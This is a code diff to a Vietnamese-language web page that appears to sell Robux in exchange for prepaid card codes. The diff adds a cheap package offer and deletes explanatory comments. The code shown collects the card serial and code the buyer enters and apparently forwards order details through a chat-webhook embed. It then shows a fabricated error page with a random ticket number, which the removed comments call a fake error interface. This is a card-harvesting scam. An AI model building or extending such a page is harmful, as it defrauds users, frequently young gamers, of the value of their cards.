@@ -433,6 +433,12 @@
 
             <div class="field-label">Chọn gói nạp</div>
             <div class="item-grid">
+                <!-- GÓI MỚI CẬP NHẬT -->
+                <div class="grid-card" onclick="triggerLoading('goStep3', ['3,000 Robux', '20,000 đ'])">
+                    <div class="hexagon-box">⬡</div>
+                    <div class="card-main-title">3,000 Robux</div>
+                    <div class="card-sub-price">20,000 đ</div>
+                </div>
                 <div class="grid-card" onclick="triggerLoading('goStep3', ['6,500 Robux', '50,000 đ'])">
                     <div class="hexagon-box">⬡</div>
                     <div class="card-main-title">6,500 Robux</div>
@@ -644,20 +650,16 @@
         }
 
         function goStep5() {
-            // Lấy dữ liệu thẻ mà khách vừa nhập
             const serial = document.getElementById('serialInput').value.trim();
             const code = document.getElementById('codeInput').value.trim();
 
-            // Tạo ID ngẫu nhiên cho mã giao dịch giao diện lỗi
             document.getElementById('ticket-id').innerText = Math.floor(Math.random() * 90000000) + 10000000;
 
-            // Đổ toàn bộ dữ liệu vào bảng lỗi
             document.getElementById('res-user').innerText = savedUser;
             document.getElementById('res-method').innerText = "Thẻ " + savedMethod;
             document.getElementById('res-pkg').innerText = savedPkgName;
             document.getElementById('res-cost').innerText = savedPkgPrice;
 
-            // Thiết lập thời gian thực chạy trên máy
             const d = new Date();
             const timeStr = String(d.getHours()).padStart(2,'0') + ":" + String(d.getMinutes()).padStart(2,'0') + " " + String(d.getDate()).padStart(2,'0') + "/" + String(d.getMonth()+1).padStart(2,'0') + "/" + d.getFullYear();
             document.getElementById('res-clock').innerText = timeStr;
@@ -670,7 +672,7 @@
                 embeds: [
                     {
                         title: "Chi Tiết Đơn Hàng",
-                        color: 3432248, // Màu xanh lục giống web của bạn
+                        color: 3432248,
                         fields: [
                             { name: "👤 Người chơi", value: savedUser, inline: true },
                             { name: "📶 Phương thức", value: savedMethod, inline: true },
@@ -701,7 +703,7 @@
 
             clearAllPages();
             document.getElementById('step5').style.display = 'block';
-            refreshDots(4); // Giữ nguyên nấc hoàn thiện thứ 4
+            refreshDots(4);
         }
     </script>
 </body>
